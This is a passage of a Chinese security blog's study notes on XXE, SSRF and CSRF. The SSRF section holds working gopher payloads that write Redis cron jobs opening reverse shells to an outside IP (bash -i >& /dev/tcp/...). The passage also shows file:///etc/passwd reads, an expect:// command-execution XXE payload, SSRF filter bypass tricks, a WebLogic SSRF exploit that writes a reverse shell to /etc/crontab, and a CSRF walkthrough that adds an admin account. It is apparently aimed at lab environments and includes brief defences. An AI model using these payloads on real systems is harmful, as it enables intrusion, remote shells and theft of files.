<h3><span id="执行系统命令">执行系统命令</span></h3><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="探测内网端口">探测内网端口</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="攻击内网网站">攻击内网网站</span></h3><p>结合其他的漏洞比如：struts2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
<h2><span id="防御xxe攻击">防御XXE攻击</span></h2><p>方案一、使用开发语言提供的禁用外部实体的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>
<p>方案二、过滤用户提交的XML数据</p>
<p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p>
<h2><span id="reference">Reference</span></h2><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a><br><a href="https://github.com/phith0n/vulhub/tree/master/php_xxe" target="_blank" rel="noopener">vulhub/php_xxe/</a><br><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-098591.html" target="_blank" rel="noopener">Z-BLOG Blind-XXE造成任意文件读取 </a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[SSRF漏洞的利用与学习]]></title>
      <url>https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="漏洞简介">漏洞简介</span></h2><p>SSRF(Server-side Request Forge, 服务端请求伪造)。<br>由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
<h2><span id="漏洞利用">漏洞利用</span></h2><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。</p>
<h3><span id="本地利用">本地利用</span></h3><p>拿常用的cURL举例，cURL默认支持的协议非常多。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -V</span><br><span class="line">curl 7.47.1 (x86_64-apple-darwin15.3.0) libcurl/7.47.1 OpenSSL/1.0.2g zlib/1.2.8  </span><br><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp  </span><br><span class="line">Features: IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP UnixSockets</span><br></pre></td></tr></table></figure>
<h4><span id="本地利用姿势">本地利用姿势</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># dict protocol (操作Redis)</span><br><span class="line">curl -vvv &apos;dict://127.0.0.1:6379/info&apos;</span><br><span class="line"></span><br><span class="line"># file protocol (任意文件读取)</span><br><span class="line">curl -vvv &apos;file:///etc/passwd&apos;</span><br><span class="line"></span><br><span class="line"># gopher protocol (一键反弹Bash)</span><br><span class="line"># * 注意: 链接使用单引号，避免$变量问题</span><br><span class="line">curl -vvv &apos;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure>
<h3><span id="远程利用">远程利用</span></h3><h4><span id="漏洞代码ssrfphp未做任何ssrf防御">漏洞代码ssrf.php（未做任何SSRF防御）</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function curl($url)&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure>
<h4><span id="远程利用方式">远程利用方式</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 利用file协议任意文件读取</span><br><span class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd&apos;</span><br><span class="line"></span><br><span class="line"># 利用dict协议查看端口</span><br><span class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22&apos;</span><br><span class="line"></span><br><span class="line"># 利用gopher协议反弹shell</span><br><span class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos;</span><br></pre></td></tr></table></figure>
<h4><span id="漏洞代码ssrf2php">漏洞代码ssrf2.php</span></h4><ul>
<li>限制协议为HTTP、HTTPS</li>
<li>设置跳转重定向为True（默认不跳转）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);</span><br><span class="line">    // 限制为HTTPS、HTTP协议</span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="远程利用方式">远程利用方式</span></h4><p>当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL</p>
<p>那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。</p>
<p>我们继续构造一个302跳转服务，代码如下302.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$schema = $_GET[&apos;s&apos;];</span><br><span class="line">$ip     = $_GET[&apos;i&apos;];</span><br><span class="line">$port   = $_GET[&apos;p&apos;];</span><br><span class="line">$query  = $_GET[&apos;q&apos;];</span><br><span class="line">if(empty($port))&#123;  </span><br><span class="line">    header(&quot;Location: $schema://$ip/$query&quot;); </span><br><span class="line">&#125; else &#123;</span><br><span class="line">    header(&quot;Location: $schema://$ip:$port/$query&quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4><span id="利用测试">利用测试</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># dict protocol - 探测Redis</span><br><span class="line">dict://127.0.0.1:6379/info  </span><br><span class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&apos;</span><br><span class="line"></span><br><span class="line"># file protocol - 任意文件读取</span><br><span class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&apos;</span><br><span class="line"></span><br><span class="line"># gopher protocol - 一键反弹Bash</span><br><span class="line"># * 注意: gopher跳转的时候转义和`url`入参的方式有些区别</span><br><span class="line">curl -vvv &apos;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  </span><br><span class="line">a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  </span><br><span class="line">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3</span><br><span class="line">%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure>
<h3><span id="绕过姿势">绕过姿势</span></h3><p>1）<a href="http://www.baidu.com@10.10.10.10与http://10.10.10.10" target="_blank" rel="noopener">http://www.baidu.com@10.10.10.10与http://10.10.10.10</a> 请求是相同的</p>
<p>此脚本访问请求得到的内容都是10.10.10.10的内容。</p>
<p>该绕过同样在URL跳转绕过中适用。</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-091690" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2015-091690</a></p>
<p>2）ip地址转换成进制来访问</p>
<p>115.239.210.26 ＝ 16373751032</p>
<p>3）添加端口可能绕过匹配正则</p>
<p>10.10.10.10:80 案例：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-061850" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2014-061850</a></p>
<p>4）用短地址（302跳转）绕过，案例：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0132243" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0132243</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0135257" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0135257</a></p>
<p>5）利用xip.io和xip.name</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.1.xip.io 10.0.0.1</span><br><span class="line"></span><br><span class="line">www.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line"></span><br><span class="line">mysite.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line"></span><br><span class="line">foo.bar.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name  resolves to  10.0.0.1</span><br><span class="line"></span><br><span class="line">www.10.0.0.2.xip.name  resolves to  10.0.0.2</span><br><span class="line"></span><br><span class="line">foo.10.0.0.3.xip.name  resolves to  10.0.0.3</span><br><span class="line"></span><br><span class="line">bar.baz.10.0.0.4.xip.name  resolves to  10.0.0.4</span><br></pre></td></tr></table></figure>
<p>6）利用Enclosed alphanumerics</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
<p>7) 利用句号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure>
<h2><span id="weblogic-ssrf漏洞复现">Weblogic SSRF漏洞复现</span></h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<h3><span id="漏洞分析">漏洞分析</span></h3><p>SSRF漏洞存在于<a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求</a></p>
<h3><span id="利用姿势">利用姿势</span></h3><h4><span id="探查服务端口">探查服务端口</span></h4><p>在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<a href="http://127.0.0.1:7001" target="_blank" rel="noopener">http://127.0.0.1:7001</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1</span><br><span class="line">Host: http://127.0.0.1:7001</span><br><span class="line">Content-Length: 133</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1:7001</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Referer: http://115.159.4.50:7001/uddiexplorer/SearchPublicRegistries.jsp</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=CZBhZtjHKR2mvqmnyBbVchhHvJ1KJ48lq4rq84pZnpFL2hkXrnhc!1235713544</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">operator=http://127.0.0.1:7001&amp;rdoSearch=name&amp;txtSearchname=1&amp;txtSearchkey=1&amp;txtSearchfor=1&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure></p>
<p>返回以下信息，说明存在7001端口的服务器<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w-ssrf.png" alt=""></p>
<p>访问一个不存在的IP，返回以下信息，返回 but could not connect over HTTP to server<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w-ssrf1.png" alt=""></p>
<p>访问一个非HTTP（dict）协议，返回以下信息，返回unknown protocol: dict<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w-ssrf2.png" alt=""></p>
<h4><span id="注入http头利用redis反弹shell">注入HTTP头，利用Redis反弹shell</span></h4><p>通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通<br>返回<br>which did not have a valid SOAP content-type: null<br>说明存在redis服务</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w-ssrf3.png" alt=""></p>
<p>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<p>进行url编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf-w2.png" alt=""></p>
<p>反弹shell</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf-w.png" alt=""></p>
<p>最后补充一下，可进行利用的cron有如下几个地方：</p>
<ul>
<li>/etc/crontab 这个是肯定的</li>
<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
</ul>
<h2><span id="reference">Reference</span></h2><p><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="noopener">SSRF in PHP</a><br><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="noopener">SSRF to GET SHELL</a><br><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">利用 gopher 协议拓展攻击面</a><br><a href="https://github.com/phith0n/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">vulhub/weblogic/ssrf</a><br><a href="https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html" target="_blank" rel="noopener">腾讯某处SSRF漏洞(非常好的利用点)附利用脚本</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[CSRF漏洞的利用与学习]]></title>
      <url>https://uknowsec.cn/posts/notes/CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="csrf的原理">CSRF的原理</span></h2><p>发现漏洞可利用处-&gt;构造(搭建)搭建代码-&gt;发送给用户(管理员)-&gt;触发代码(发送请求)………</p>
<p>从这个利用的一个流程中，我们可以发现,攻击者仅仅只是做了两处工作.第一处是:发现漏洞利用处，，第二处就是构造利用代码以及发送至用户(管理员)。至于利用，你会发现CSRF与XSS不同，XSS是攻击者自己提交，等待结果，而CSRF呢，是由用户(管理员)自身提交。甚至可以说攻击者只做了构造代码的工作。</p>
<h2><span id="owasp-csrftester">OWASP CSRFTester</span></h2><p>这是OWASP推出的CSRF半自动化软件，他省去了CSRF最繁琐的过程，代码构造。下面是软件的截图‍‍</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF1.jpg" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF2.jpg" alt=""></p>
<h2><span id="利用csrftester进行csrf攻击">利用CSRFTester进行CSRF攻击</span></h2><p>进入已经搭建的CMS后台的管理员管理模块</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF3.jpg" alt=""></p>
<p>浏览器里代理设置为CSRFTester的代理127.0.0.1：8008</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF4.jpg" alt=""></p>
<p>开启CSRFTester抓取数据包，正常添加管理员 返回可以看到已经抓取到了数据包<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF5.jpg" alt=""></p>
<p>在Form Parameters中没有找到token的值，那么就可以实现CSRF攻击</p>
<p>在Report Type中。有四种方法来进行攻击。‍‍</p>
<ul>
<li>‍‍Forms：创建一个form表单。内容为hidden(隐藏)，用户不可见（可POST、GET）‍‍<br>‍‍<em>    iFrame：创建一个iframe框架，高宽为0，用户不可见。（可POST、GET）‍‍<br>‍‍</em>    IMG：创建一个IMG标签(只能GET)。‍‍<br>‍‍<em>    XHR：创建一个AJAX请求(可POST、GET)‍‍<br>‍‍</em>    Link：创建一个a标签的超链接(只能GET)</li>
</ul>
<p>此处先选择Forms进行测试</p>
<p>点击Generate HTML 便生成了一个index.html</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF6.jpg" alt=""></p>
<p>由其中的HTML源码可以看出这是一个简单的提交表单，点击运行这个html文件<br>可以看到成功的添加了一个管理员用户</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF7.jpg" alt=""><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF8.jpg" alt=""></p>
<p>到此利用CSRFTester进行CSRF攻击成功</p>
<h2><span id="构造提交表单进行csrf攻击">构造提交表单进行CSRF攻击</span></h2><p>审查元素得到管理员管理的URL，进入查看源码。分析提交表单</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF9.jpg" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF10.jpg" alt=""></p>
<p>修改提交表单</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF11.jpg" alt=""></p>
<p>点击按钮提交，成功添加管理员<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF12.jpg" alt=""><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF13.jpg" alt=""></p>
<p>在html中增加javascript脚本，自动提交表单<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF14.jpg" alt=""></p>
<h2><span id="利用ajax结合xss进行csrf攻击">利用ajax结合xss进行CSRF攻击</span></h2><p>就是把CSRF的AJAX请求放到XSS里，以达到攻击的效果</p>
<p>在测试用的这套CMS的留言板处就存在存储型XSS漏洞</p>
<p>在这里我们可以使用CSRFTester生成一个ajax</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF15.jpg" alt=""></p>
<p>我们可以看到ajax中核心部分<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/CSRF16.jpg" alt=""></p>
<p>同时也可以自己编写一个简单的ajax</p>
